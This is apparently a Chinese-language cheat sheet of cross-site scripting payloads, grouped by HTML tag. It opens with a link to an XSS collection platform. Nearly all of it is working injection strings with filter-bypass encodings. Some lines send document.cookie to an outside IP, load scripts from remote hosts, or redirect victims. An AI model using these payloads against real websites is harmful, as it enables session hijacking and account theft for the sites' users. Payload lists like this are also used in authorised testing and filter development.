## 06-xss payload

#### 一、环境搭建
	https://github.com/78778443/xssplatform

#### 二、payload

##### script标签

	¼script¾alert(¢xss¢)¼/script¾

	%3Cscript%3Ealert('XSS')%3C/script%3E

	<0x736372697074>alert('XSS')</0x736372697074>

	<char(115,99,114,105,112,116)>alert('XSS')</char(115,99,114,105,112,116)>

	<script language=JavaScript>alert('XSS')</script>

	<ScRiPt>prompt(1)</ScRiPt>

	<script>co\u006efir\u006d`1`</script>

	<script>eval(String.fromCharCode(97,108,101,114,116,40,39,105,110,115,105,103,104,116,45,108,97,98,115,39,41))</script>

	<script>alert('XSS');</script>
	
	<script>var myVar="XSS"; alert(myVar)</script>
	
	<script>alert(document.cookie)</script>
	
	<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

	<script>alert&#40/1/&#41</script>

	<script>`</div><div>`-alert(123)</script>

	<script>`</div><div>`+alert(123)</script>

	<script>`</div><div>`/alert(123)</script>

	<script>`</div><div>`%alert(123)</script>

	<script>`</div><div>`==alert(123)</script>

	<script src=http://baidu.com/></SCRIPT>

	<SCRIPT/XSS SRC="http://192.168.156.210:33333/"></SCRIPT>

	<script/src=data:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,alert(4)></script>

	<script>location.href='http://1.1.1.1//'+escape(document.cookie);</script>

	<SCRIPT>document.write("<SCRI");</SCRIPT>PT src="http://1.1.1.1/"></SCRIPT>

	<script>a=eval;b=alert;a(b(/i/.source));</script>

	<SCRIPT a=">" SRC="http://ha.ckers.org/"></SCRIPT>

	<script src="http://192.168.156.210:33333/"></script>

	<SCRIPT>document.write("<SCRI");</SCRIPT>PT src="http://192.168.156.210:33333/"></SCRIPT>

	<script>document.location='http://1.1.1.1';</script>

	<script>window.open("http://192.168.156.210:33333/")</script>

##### a标签

	<a onclick="i=createElement('iframe');i.src='javascript:alert(/xss/)';x=parentNode;x.appendChild(i);" href="#">Test</a>

	<A href=http://192.168.156.210:33333/>link</A>

	<a/href=javascript&colon;co\u006efir\u006d&#40;&quot;/xss/&quot;&#41;>/XSS/</a>
	
	<a href=javascript:alert(1)>aaa</a>

	<a href=javascript:prompt(1)>Clickme</a>
	
	<a href="javascript:\u0061lert(1)">X    
	
	<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">    
	
	<a href="javascript:confirm%28 1%29">Clickme</a>
	
	<a href="javascrip&#x0000000000000000074;:prompt(1)">x</a>
	
	<a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>
	
	<a href="javascript:x=open('http://192.168.156.210:33333/');">Test</a>    
	
	<a href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#41">Test</a>
	
	<a onmouseover=location='javascript:alert(1)'>click
	
	<a onmouseover=alert(document.cookie)>xxs link</a>
	
	<a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
	
	<a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>


##### img标签

	<img src=http://127.0.0.1/myspace.asp>

	<img/µ/a\:script/src=x onerror=alert(1)//>

	<img src=x:alert(alt) onerror=eval(src) alt=0>

	<img/src=="x onerror=alert(1)//">

	<img src=x onerror=alert(/i/)>

	<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>

	<img src=x onerror=confirm(1)>

	<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>

	<img src=x onerror=co\u006efir\u006d`1`>

	<img src=1.gif onerror=alert(1)>

	<img src=x onerror=prompt(1);>

	<img src="/" =_=" title="onerror='prompt(1)'">

	<img src ?itworksonchrome?\/onerror = alert(1)>

	<img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>

	<img onerror="location='javascript:%61lert(1)'" src="x">

	<img onerror="location='javascript:\x2561lert(1)'" src="x">

	<img onerror="location='javascript:\x255Cu0061lert(1)'" src="x" >

	<img onerror=alert(0) src=>

	<img/id="confirm&lpar;1)"alt="/"src="/"onerror=eval(id)>

	<IMG SRC=# onmouseover="alert('1')">


##### iframe标签
	
	
	<iframe/src=javascript:prompt(1)>
	
	<iframe/src="javascript:alert`2`">
	
	<iframe src="javascript:alert(2)">
	
	<iframe/src="javascript:&#97;&#108;&#101;&#114;&#116;`2`">
	
	<iframe src="javascript:%20%0aalert%20%0d %09(1)">
	
	<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
	
	<iframe src=http://baidu.com>
	
	<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C	
	%2F%73%63%72%69%70%74%3E"></iframe>
	
	<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
	
	<iframe/onload=alert(/insight-labs/)>
	
	<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>


##### details标签

	<details open ontoggle="https://xsspt.com/ahcDid">
	
	<details/open/ontoggle=co\u006efir\u006d`1`>

	<details open ontoggle="alert(/x/);">

	<details ontoggle=alert(1)>

	<details/ontoggle=co\u006efir\u006d`1`>
	
	<details open ontoggle="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#24050;&#26159;&#40644;&#26127;&#29420;&#33258;&#24833;&#65292;&#19968;&#26525;&#32418;&#26447;&#20986;&#22681;&#26469;&#39;&#41;">


##### input标签
	
	<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;">
	
	<input onblur=javascript:alert(1) autofocus><input autofocus>
	
	<input autofocus onblur=alert(1)>
	
	<input value:aa/onclick=alert(/xss/)>
	
	<input onfocus=javascript:alert(1) autofocus>
	
	<input onfocus=alert(1) autofocus>
	
	<Input/Autofocus/%0D*/Onfocus=confirm`1`//>
	
	<Input/Autofocus/Onfocus=confirm`1`>
	
	<form><input formaction=javascript:alert(1) type=image src=SOURCE> 
	
	<form><input formaction=javascript:alert(1) type=submit value=click>
	
	<form><input formaction=javascript:alert(1) type=image value=click>
	
	<form><input formaction=javascript:alert(1) type=image src=http://1.1.1.1/>
	
	</form><input type&#61;"date" onfocus="alert(1)">
	
	<input type=image src=x onerror=alert`XSS`>
	
	<input type="text" value=""onfocus=location='javascript:alert`1`' autofocus"”/>
	
	<input type="text" value="1" onclick="alert(1)" />
	
	<input type="text"value=""onclick="location=window[`atob`]`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21ha W4p`"/>

##### svg标签
	
	<svg/onload=alert('1')>
	
	<svg onload=alert(4)//
	
	<svg/onload=prompt(5)>
	
	<svg/onload=co\u006efir\u006d`6`>
	
	<svg onload='JavascRipT:alert%287%29'>
	
	<svg/onload ="location='jav'+'ascript'+':%2'+'0aler'+'t%20%2'+'81%'+'29'">
	
	<svg/onload=setTimeout('alert(8)',0)>
	
	<iframe/src="data:text/html,<svg onload=alert(1)>">
	
	<iframe srcdoc="<svg onload=alert(1)&nvgt;"></iframe>

##### 其它标签

	"onblur=alert(1) autofocusa="

	%c0%22;alert(1);    //宽字节绕过过滤       
	
	<isindex formaction=javascript:alert(/XSS/) type=submit>
	
	<aaaaa onclick=alert(1) src=x>click
	
	<audio src=x onerror=prompt(1)>
	
	<code onmouseover=a=eval;b=alert;a(b(/g/.source));>HI</code>
	
	<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=	j&#97v&#97script:&#97lert(1)>Click
	
	<plaintext/onmouseover=prompt(2)>
	
	<LԱ onclick=alert(1)>click me</LԱ>
	
	最短  
	<s/onclick=alert()>b
	
	<video src=x onerror=prompt(1)>
	
	<video><source onerror="alert(1)">
	
	markdown xss:
	输入：[test](javascript://%0d%0aprompt(1);com)
	输出：<ahref="javascript://%0d%0aprompt(1);com">test</a>
	
	[color=red' onmouseover='alert('xss')']mouse over[/color]
	
	<form oninput="alert(1)"><input type="range">
	
	<form onsubmit=alert(1)><input type=submit>
	
	<form action="Javascript:alert(1)"><input type=submit> // Firefox, IE
	
	<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/	type='submit'>//
	
	<keygen onfocus=javascript:alert(1) autofocus>  firefox
	
	<select/keygen/textarea autofocus onfocus=alert(1)>
	
	<select onfocus=alert(1) autofocus>
	
	<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
	
	<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</	button>
	
	<form><button formaction=javascript&colon;alert(1)>
	
	<textarea autofocus onfocus=co\u006efir\u006d(1)>
	
	<textarea autofocus onfocus=prompt(2)>
	
	<p onmouseover=alert(/insight-labs/)>insight-labs here.</p>
	
	
	<h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
	
	<h1 onclick=prompt(1)>Clickme</h1>
	
	<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg></object>
	
	<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
	
	<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/"></OBJECT>
	
	<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/	html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">  火狐
	
	<meta http-equiv="refresh" content="5">
	
	<meta http-equiv="refresh" content="1; url=http://baidu.com//">
	
	<frameset onload=alert(/insight-labs/)>
	
	<frameset onpageshow="alert(1)">
	
	<FRAMESET><FRAME src=javascript:alert('XSS')></FRAME></FRAMESET>
	
	<frameset rows="100%"><frame noresize="noresize" frameborder ="0" title="XSS 	Found by HR" src="http://baidu.com"></frame></frameset>
	
	<div/onmouseover='alert(1)'>X</div>
	
	<div/style=="x onclick=alert(1)//">
	
	<div style=behavior:url(" onclick=alert(1)//">XSS'OR
	
	<div style=x:x(" onclick=alert(1)//">XSS
	
	<DIV STYLE="behaviour:url('http://xsspt.com/6Si1xA');">
	
	<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
	
	<body onpageshow="alert(1)">
	
	<BODY ONLOAD=alert('2')>
	
	<body onLoad="document.location.href='http://ip.sb'">  //跳转
	
	<BODY ONLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT>
	
	